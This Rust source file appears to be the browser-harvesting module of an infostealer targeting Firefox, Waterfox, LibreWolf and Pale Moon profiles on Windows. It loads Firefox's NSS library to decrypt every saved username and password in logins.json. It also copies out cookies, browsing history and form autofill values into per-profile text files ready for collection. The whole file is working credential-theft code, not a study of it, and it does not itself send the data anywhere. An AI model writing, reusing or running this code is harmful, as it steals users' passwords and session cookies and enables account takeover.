use std::{env, ffi, fs, path::{Path, PathBuf}};
use rusqlite::Connection;
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;

struct GeckoBrowserInfo {
    name: &'static str,
    profiles_path: PathBuf,
}

fn get_browsers() -> Vec<GeckoBrowserInfo> {
    let roaming = env::var("APPDATA").unwrap_or_default();

    vec![
        GeckoBrowserInfo {
            name: "Firefox",
            profiles_path: PathBuf::from(&roaming).join("Mozilla").join("Firefox").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "Waterfox",
            profiles_path: PathBuf::from(&roaming).join("Waterfox").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "LibreWolf",
            profiles_path: PathBuf::from(&roaming).join("librewolf").join("Profiles"),
        },
        GeckoBrowserInfo {
            name: "PaleMoon",
            profiles_path: PathBuf::from(&roaming)
                .join("Moonchild Productions")
                .join("Pale Moon")
                .join("Profiles"),
        },
    ]
}

// ── Firefox installation discovery ─────────────────────────────────────────

fn find_firefox_dir() -> Option<PathBuf> {
    let candidates = [
        PathBuf::from(r"C:\Program Files\Mozilla Firefox"),
        PathBuf::from(r"C:\Program Files (x86)\Mozilla Firefox"),
    ];
    for p in &candidates {
        if p.join("nss3.dll").exists() {
            return Some(p.clone());
        }
    }
    None
}

// ── NSS FFI types ──────────────────────────────────────────────────────────

#[repr(C)]
struct SECItem {
    item_type: u32,
    data: *mut u8,
    len: u32,
}

// ── NSS-based password decryption ──────────────────────────────────────────

fn decrypt_nss_value(nss_lib: &libloading::Library, encrypted_b64: &str) -> Option<String> {
    let encrypted = general_purpose::STANDARD.decode(encrypted_b64).ok()?;

    unsafe {
        let pk11sdr_decrypt: libloading::Symbol<
            unsafe extern "C" fn(*mut SECItem, *mut SECItem, *mut ffi::c_void) -> i32,
        > = nss_lib.get(b"PK11SDR_Decrypt").ok()?;

        let mut input = SECItem {
            item_type: 0,
            data: encrypted.as_ptr() as *mut u8,
            len: encrypted.len() as u32,
        };

        let mut output = SECItem {
            item_type: 0,
            data: std::ptr::null_mut(),
            len: 0,
        };

        let status = pk11sdr_decrypt(&mut input, &mut output, std::ptr::null_mut());

        if status == 0 && !output.data.is_null() && output.len > 0 {
            let result =
                std::slice::from_raw_parts(output.data, output.len as usize).to_vec();

            // Free the allocated data
            if let Ok(free_fn) =
                nss_lib.get::<unsafe extern "C" fn(*mut SECItem, i32)>(b"SECITEM_ZfreeItem")
            {
                free_fn(&mut output, 0); // 0 = only free data, not the struct
            }

            String::from_utf8(result).ok()
        } else {
            None
        }
    }
}

/// Extract passwords from a single Firefox profile using NSS
fn extract_passwords_nss(profile_path: &Path, firefox_dir: &Path) -> Option<String> {
    // Prepend Firefox dir to PATH so nss3.dll can find its dependency DLLs
    let original_path = env::var("PATH").unwrap_or_default();
    #[allow(unused_unsafe)]
    unsafe {
        env::set_var("PATH", format!("{};{}", firefox_dir.display(), original_path));
    }

    let result = (|| -> Option<String> {
        let nss_lib =
            unsafe { libloading::Library::new(firefox_dir.join("nss3.dll")).ok()? };

        // Initialize NSS with the profile directory
        unsafe {
            let nss_init: libloading::Symbol<
                unsafe extern "C" fn(*const ffi::c_char) -> i32,
            > = nss_lib.get(b"NSS_Init").ok()?;

            let profile_cstr =
                ffi::CString::new(profile_path.to_string_lossy().as_bytes()).ok()?;
            let status = nss_init(profile_cstr.as_ptr());
            if status != 0 {
                return None;
            }
        }

        // Read logins.json
        let logins_path = profile_path.join("logins.json");
        let content = fs::read_to_string(&logins_path).ok()?;
        let json: Value = serde_json::from_str(&content).ok()?;
        let logins = json["logins"].as_array()?;

        let mut output = String::new();
        for login in logins {
            let hostname = login["hostname"].as_str().unwrap_or("N/A");
            let enc_username = login["encryptedUsername"].as_str().unwrap_or("");
            let enc_password = login["encryptedPassword"].as_str().unwrap_or("");

            let username = decrypt_nss_value(&nss_lib, enc_username)
                .unwrap_or_else(|| "[decryption failed]".to_string());
            let password = decrypt_nss_value(&nss_lib, enc_password)
                .unwrap_or_else(|| "[decryption failed]".to_string());

            output.push_str(&format!(
                "URL: {}\nUsername: {}\nPassword: {}\n{}\n",
                hostname,
                username,
                password,
                "-".repeat(50)
            ));
        }

        // Shutdown NSS
        unsafe {
            if let Ok(nss_shutdown) =
                nss_lib.get::<unsafe extern "C" fn() -> i32>(b"NSS_Shutdown")
            {
                let _ = nss_shutdown();
            }
        }

        if output.is_empty() { None } else { Some(output) }
    })();

    // Restore original PATH
    #[allow(unused_unsafe)]
    unsafe {
        env::set_var("PATH", original_path);
    }
    result
}

// ── SQLite helpers ─────────────────────────────────────────────────────────

fn copy_db(db_path: &Path) -> Option<PathBuf> {
    if !db_path.exists() {
        return None;
    }
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let temp = env::temp_dir().join(format!("gk_db_{}.sqlite", nanos));
    fs::copy(db_path, &temp).ok()?;

    // Copy WAL/SHM if present
    let db_name = db_path.to_string_lossy().to_string();
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["-wal", "-shm", "-journal"] {
        let src = PathBuf::from(format!("{}{}", db_name, suffix));
        if src.exists() {
            let dst = PathBuf::from(format!("{}{}", temp_name, suffix));
            let _ = fs::copy(&src, &dst);
        }
    }

    Some(temp)
}

fn cleanup_db(temp: &Path) {
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["", "-wal", "-shm", "-journal"] {
        let path = PathBuf::from(format!("{}{}", temp_name, suffix));
        let _ = fs::remove_file(&path);
    }
}

// ── Extraction functions ───────────────────────────────────────────────────

fn extract_cookies(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("cookies.sqlite"))?;
    let conn = Connection::open(&temp).ok()?;

    let mut stmt = conn
        .prepare("SELECT host, name, value, path, expiry FROM moz_cookies")
        .ok()?;

    let mut output = String::new();
    let rows = stmt
        .query_map([], |row| {
            let host: String = row.get(0)?;
            let name: String = row.get(1)?;
            let value: String = row.get(2)?;
            let path: String = row.get(3)?;
            let expiry: i64 = row.get(4)?;
            Ok((host, name, value, path, expiry))
        })
        .ok()?;

    for row in rows.flatten() {
        let (host, name, value, path, expiry) = row;
        output.push_str(&format!(
            "Host: {}\nName: {}\nValue: {}\nPath: {}\nExpires: {}\n{}\n",
            host,
            name,
            value,
            path,
            expiry,
            "-".repeat(50)
        ));
    }

    drop(stmt);
    drop(conn);
    cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_history(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("places.sqlite"))?;
    let conn = Connection::open(&temp).ok()?;

    let mut stmt = conn
        .prepare(
            "SELECT url, title, visit_count, last_visit_date \
             FROM moz_places WHERE visit_count > 0 \
             ORDER BY last_visit_date DESC",
        )
        .ok()?;

    let mut output = String::new();
    let rows = stmt
        .query_map([], |row| {
            let url: String = row.get(0)?;
            let title: Option<String> = row.get(1)?;
            let visit_count: i64 = row.get(2)?;
            let last_visit: Option<i64> = row.get(3)?;
            Ok((url, title, visit_count, last_visit))
        })
        .ok()?;

    for row in rows.flatten() {
        let (url, title, visit_count, last_visit) = row;
        output.push_str(&format!(
            "URL: {}\nTitle: {}\nVisits: {}\nLast Visit: {}\n{}\n",
            url,
            title.unwrap_or_default(),
            visit_count,
            last_visit.unwrap_or(0),
            "-".repeat(50)
        ));
    }

    drop(stmt);
    drop(conn);
    cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_autofill(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("formhistory.sqlite"))?;
    let conn = Connection::open(&temp).ok()?;

    let mut stmt = conn
        .prepare("SELECT fieldname, value, timesUsed FROM moz_formhistory")
        .ok()?;

    let mut output = String::new();
    let rows = stmt
        .query_map([], |row| {
            let name: String = row.get(0)?;
            let value: String = row.get(1)?;
            let count: i64 = row.get(2)?;
            Ok((name, value, count))
        })
        .ok()?;

    for row in rows.flatten() {
        let (name, value, count) = row;
        output.push_str(&format!(
            "Field: {}\nValue: {}\nUsed: {}\n{}\n",
            name,
            value,
            count,
            "-".repeat(50)
        ));
    }

    drop(stmt);
    drop(conn);
    cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

// ── Profile discovery ──────────────────────────────────────────────────────

fn get_profiles(profiles_dir: &Path) -> Vec<(String, PathBuf)> {
    let mut profiles = Vec::new();
    if let Ok(entries) = fs::read_dir(profiles_dir) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                let name = entry.file_name().to_string_lossy().to_string();
                profiles.push((name, entry.path()));
            }
        }
    }
    profiles
}

// ── Public entry point ─────────────────────────────────────────────────────

pub fn extract_all() -> Vec<(String, String)> {
    let mut results = Vec::new();
    let firefox_dir = find_firefox_dir();

    for browser in get_browsers() {
        if !browser.profiles_path.exists() {
            continue;
        }

        let profiles = get_profiles(&browser.profiles_path);

        for (profile_name, profile_path) in profiles {
            let folder = format!("{}/{}", browser.name, profile_name);

            // Passwords (requires nss3.dll from Firefox installation)
            if let Some(ref ff_dir) = firefox_dir {
                if let Some(data) = extract_passwords_nss(&profile_path, ff_dir) {
                    results.push((format!("{}/passwords.txt", folder), data));
                }
            }

            if let Some(data) = extract_cookies(&profile_path) {
                results.push((format!("{}/cookies.txt", folder), data));
            }
            if let Some(data) = extract_history(&profile_path) {
                results.push((format!("{}/history.txt", folder), data));
            }
            if let Some(data) = extract_autofill(&profile_path) {
                results.push((format!("{}/autofill.txt", folder), data));
            }
        }
    }

    results
}
